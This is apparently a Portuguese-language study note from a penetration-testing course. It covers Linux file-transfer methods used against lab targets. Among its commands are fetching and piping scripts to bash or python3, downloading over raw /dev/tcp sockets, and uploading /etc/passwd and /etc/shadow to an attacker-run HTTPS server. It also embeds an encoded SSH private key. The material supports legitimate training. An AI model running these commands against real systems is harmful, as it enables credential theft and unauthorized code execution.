> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/file-transfers/linux-file-transfer-methods.md).

# Linux File Transfer Methods

#### Codificação/Decodificação Base64

* **PwnBox - Verificar hash MD5 do arquivo**

```sh
md5sum id_rsa
```

* **PwnBox - Codificar chave SSH para Base64**

```sh
cat id_rsa |base64 -w 0;echo
```

* &#x20;**Linux - Decodificar o arquivo**

```sh
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

* **Linux - Confirme a correspondência de hashes MD5**

```sh
md5sum id_rsa
```

***

### Downloads da Web com Wget e cURL

* **Baixar um arquivo usando wget**

```sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

* **Baixar um arquivo usando cURL**

```sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

* **Executar uma ferramenta diretamente com o cURL**

```sh
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

* **Download sem arquivo com wget**

```sh
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

***

### Download with Bash (/dev/tcp)

* **Conecte-se ao servidor da Web de destino**

```
exec 3<>/dev/tcp/10.10.10.32/80
```

* **Solicitação HTTP GET**

```sh
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

* **Imprimir a resposta**

```sh
cat <&3
```

***

### Downloads SSH

`SCP`(secure copy) é um utilitário de linha de comando que permite que você copie arquivos e diretórios entre dois hosts com segurança.

* **Habilitando o servidor SSH**

```sh
sudo systemctl enable ssh
```

* **Iniciando o servidor SSH**

```sh
sudo systemctl start ssh
```

* **Verificando a porta de escuta SSH**

```sh
netstat -lnpt
```

* **Linux - Baixando arquivos usando SCP**

```sh
scp plaintext@192.168.49.128:/root/myroot.txt .
```

{% hint style="warning" %}
Observação: você pode criar uma conta de usuário temporária para transferências de arquivos e evitar usar suas credenciais ou chaves primárias em um computador remoto.
{% endhint %}

***

### Upload Operations

* **Pwnbox - Iniciar Servidor Web**

```sh
sudo python3 -m pip install --user uploadserver
```

* **Pwnbox - Crie um certificado autoassinado**

```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

* O servidor web não deve hospedar o certificado. Recomendamos criar um novo diretório para hospedar o arquivo para nosso servidor web.

* **Pwnbox - Iniciar Servidor Web**

```sh
mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

* **Linux - Carregar vários arquivos**

```sh
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

***

### Alternative Web File Transfer Method

* **Linux - Criando um servidor web com Python3**

```sh
python3 -m http.server
```

* **Linux - Criando um servidor web com Python2.7**

```sh
python2.7 -m SimpleHTTPServer
```

* **Linux - Criando um Servidor Web com PHP**

```
php -S 0.0.0.0:8000
```

* **Linux - Criando um Servidor Web com Ruby**

```
ruby -run -ehttpd . -p8000
```

* **Baixe o arquivo da máquina de destino para o Pwnbox**

```sh
wget 192.168.49.128:8000/filetotransfer.txt
```

***

### SCP Upload

* **File Upload using SCP**

```sh
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
